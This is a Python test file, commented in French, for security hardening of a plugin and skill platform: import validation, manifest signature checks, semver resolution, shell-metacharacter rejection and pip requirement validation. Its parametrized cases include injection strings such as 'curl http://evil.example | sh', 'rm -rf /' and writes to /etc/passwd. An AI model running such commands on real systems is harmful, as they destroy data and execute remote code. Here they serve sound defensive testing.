"""Tests de durcissement des extensions — Skills, Plugins, outils (mandat sécurité).

Périmètre (les extensions sont des composants non fiables par défaut) :

- **Plugin validator** : les imports/builtins interdits couvrent les formes
  d'import pointé (``import os.path`` lie le module racine ``os``) — pas de
  contournement par le nom complet ;
- **Plugin loader** : la signature d'intégrité du manifest
  (``manifest.json.sha256``) est vérifiée quand elle existe, et la résolution
  de version est sémantique (pas lexicale : ``1.10.0`` > ``1.9.0``) ;
- **Terminal plugin** : la whitelist de commandes n'est pas contournable par
  les métacaractères d'enchaînement / redirection / continuation ;
- **Skill Lab** : les requirements pip acceptés par l'API sont validés
  (PEP 508 simplifié) et transmis en arguments positionnels — aucune
  interpolation dans la ligne ``sh -c``.

Ces tests ne touchent ni Docker ni le réseau.
"""

from __future__ import annotations

import hashlib
import json
import re

import pytest
from core.plugins.validator import PluginValidator
from core.skills.lab import SkillLab, _safe_container_name, _validate_requirements
from plugins.loader import PluginLoader, PluginMeta
from plugins.terminal.main import TerminalPlugin
from plugins.versioning import PluginVersion

# ── Plugin validator : imports pointés ──────────────────────────────────────


class TestPluginValidatorDottedImports:
    """``import os.path`` (forme pointée) doit être refusé comme ``import os``."""

    def test_dotted_forbidden_import_rejected(self, tmp_path):
        (tmp_path / "plugin.py").write_text("import os.path\n")
        result = PluginValidator().validate_imports(tmp_path)
        assert not result.valid
        assert "os.path" in result.error

    def test_dotted_submodule_of_forbidden_root_rejected(self, tmp_path):
        (tmp_path / "plugin.py").write_text("import subprocess.foo\n")
        result = PluginValidator().validate_imports(tmp_path)
        assert not result.valid
        assert "subprocess.foo" in result.error

    def test_allowed_dotted_import_still_valid(self, tmp_path):
        """Aucun faux positif : un import pointé autorisé reste accepté."""
        (tmp_path / "plugin.py").write_text("import json.decoder\n")
        assert PluginValidator().validate_imports(tmp_path).valid

    def test_dotted_import_does_not_silence_later_forbidden_call(self, tmp_path):
        """Le contrôle reste global au fichier (l'import pointé ne l'annule pas)."""
        (tmp_path / "plugin.py").write_text("import os.path\nresult = eval('1+1')\n")
        result = PluginValidator().validate_imports(tmp_path)
        assert not result.valid


# ── Plugin loader : signature d'intégrité + semver ──────────────────────────


def _write_plugin(base, name="mon-plug", version="1.0.0"):
    """Crée un plugin minimal chargeable (manifest legacy + entry point)."""
    plugin_dir = base / name
    plugin_dir.mkdir()
    (plugin_dir / "plugin.py").write_text("def run():\n    return 1\n")
    manifest = {"name": name, "version": version, "api_version": "2"}
    (plugin_dir / "manifest.json").write_text(json.dumps(manifest))
    return plugin_dir


def _loader_for(base):
    """Loader dont l'unique chemin de découverte est le dossier de test."""
    loader = PluginLoader()
    loader._search_paths = lambda: [base]  # type: ignore[method-assign]
    return loader


class TestPluginLoaderIntegrity:
    def test_unsigned_plugin_loads(self, tmp_path):
        """Pas de fichier de signature : chemin développement, chargement OK."""
        _write_plugin(tmp_path)
        assert _loader_for(tmp_path).load("mon-plug") is not None

    def test_valid_signature_loads(self, tmp_path):
        plugin_dir = _write_plugin(tmp_path)
        digest = hashlib.sha256((plugin_dir / "manifest.json").read_bytes()).hexdigest()
        (plugin_dir / "manifest.json.sha256").write_text(digest)
        assert _loader_for(tmp_path).load("mon-plug") is not None

    def test_invalid_signature_rejected(self, tmp_path):
        """Signature présente mais invalide : le plugin n'est jamais chargé."""
        plugin_dir = _write_plugin(tmp_path)
        (plugin_dir / "manifest.json.sha256").write_text("0" * 64)
        assert _loader_for(tmp_path).load("mon-plug") is None

    def test_tampered_manifest_rejected(self, tmp_path):
        """Manifest modifié après signature : refus (intégrité de provenance)."""
        plugin_dir = _write_plugin(tmp_path)
        digest = hashlib.sha256((plugin_dir / "manifest.json").read_bytes()).hexdigest()
        (plugin_dir / "manifest.json.sha256").write_text(digest)
        manifest = json.loads((plugin_dir / "manifest.json").read_text())
        manifest["description"] = "altéré"
        (plugin_dir / "manifest.json").write_text(json.dumps(manifest))
        assert _loader_for(tmp_path).load("mon-plug") is None


class TestPluginLoaderSemver:
    def test_semver_comparison_is_not_lexical(self):
        assert PluginVersion.parse("1.10.0") > PluginVersion.parse("1.9.0")

    def test_newer_version_replaces(self):
        loader = PluginLoader()
        existing = PluginMeta({"name": "p", "version": "1.9.0"}, None)
        assert loader._resolve_version("p", "1.10.0", existing) is True

    def test_older_version_does_not_replace(self):
        loader = PluginLoader()
        existing = PluginMeta({"name": "p", "version": "1.10.0"}, None)
        assert loader._resolve_version("p", "1.9.0", existing) is False

    def test_non_semver_falls_back_to_lexical(self):
        """Version non semver : repli lexical — jamais d'exception."""
        loader = PluginLoader()
        existing = PluginMeta({"name": "p", "version": "v1"}, None)
        assert loader._resolve_version("p", "v2", existing) is True
        assert loader._resolve_version("p", "v0", existing) is False


# ── Terminal plugin : métacaractères shell ──────────────────────────────────


class TestTerminalCommandValidation:
    """La whitelist de commandes ne doit pas être contournable via le shell."""

    @pytest.fixture()
    def plugin(self, tmp_path):
        return TerminalPlugin({"working_directory": str(tmp_path)})

    def test_allowed_command_accepted(self, plugin):
        assert plugin._validate_command("ls -la") == "ls -la"

    def test_command_outside_whitelist_rejected(self, plugin):
        with pytest.raises(ValueError, match="not allowed"):
            plugin._validate_command("curl http://evil.example")

    @pytest.mark.parametrize(
        "injected",
        [
            "ls -la\nrm -rf /",
            "ls -la\rrm -rf /",
            "ls -la & rm -rf /",
            "ls -la && rm -rf /",
            "ls -la ; rm -rf /",
            "ls -la > /etc/passwd",
            "ls -la < /etc/passwd",
            "ls -la | rm -rf /",
            "ls -la $(id)",
            "ls -la `id`",
        ],
    )
    def test_shell_metacharacters_rejected(self, plugin, injected):
        """Enchaînement, redirection et continuation sont refusés."""
        with pytest.raises(ValueError, match="Dangerous pattern"):
            plugin._validate_command(injected)


# ── Skill Lab : requirements non fiables ────────────────────────────────────


class TestSkillLabRequirements:
    """Les dépendances pip viennent de l'API : validation stricte + argv."""

    @pytest.fixture()
    def lab(self):
        return SkillLab(docker_client=None)

    def test_simple_requirements_accepted(self):
        assert _validate_requirements(["requests", "django[argon2]==4.2", "a>=1,<3"]) == [
            "requests",
            "django[argon2]==4.2",
            "a>=1,<3",
        ]

    @pytest.mark.parametrize(
        "injected",
        [
            ["requests; curl http://evil.example | sh"],
            ["requests && rm -rf /"],
            ["requests `id`"],
            ["requests > /tmp/leak"],
            ["requests\nrm -rf /"],
            ["--index-url http://evil.example"],
            ["requests @ http://evil.example/pkg.tar.gz"],
            [""],
        ],
    )
    def test_injected_requirements_rejected(self, injected):
        with pytest.raises(ValueError, match="politique Skill Lab"):
            _validate_requirements(injected)

    def test_command_passes_requirements_as_argv(self, lab):
        """Aucun requirement n'est interpolé dans la chaîne exécutée par sh -c."""
        cmd = lab._build_docker_command("ethan-lab-x-abc123", "/tmp/skill.py", ["requests"])
        script = cmd[cmd.index("-c") + 1]
        assert "requests" not in script
        assert cmd[-1] == "requests"  # argument positionnel du shell ($@)
        assert cmd[-2] == "ethan-lab"  # $0

    def test_command_without_requirements_uses_no_shell(self, lab):
        cmd = lab._build_docker_command("ethan-lab-x-abc123", "/tmp/skill.py", [])
        assert cmd[-2:] == ["python", "/tmp/skill.py"]

    def test_command_always_isolated(self, lab):
        """Le sandbox reste sans réseau et sous limites ressources."""
        cmd = lab._build_docker_command("ethan-lab-x-abc123", "/tmp/skill.py", [])
        assert cmd[cmd.index("--network") + 1] == "none"
        assert cmd[cmd.index("--memory") + 1] == "256m"


class TestSkillLabContainerName:
    def test_container_name_sanitized(self):
        name = _safe_container_name("My Skill!! ; rm -rf /")
        assert re.fullmatch(r"ethan-lab-[A-Za-z0-9_.-]+", name)
        assert " " not in name and ";" not in name and "/" not in name

    def test_empty_name_defaults(self):
        assert _safe_container_name("").startswith("ethan-lab-skill-")
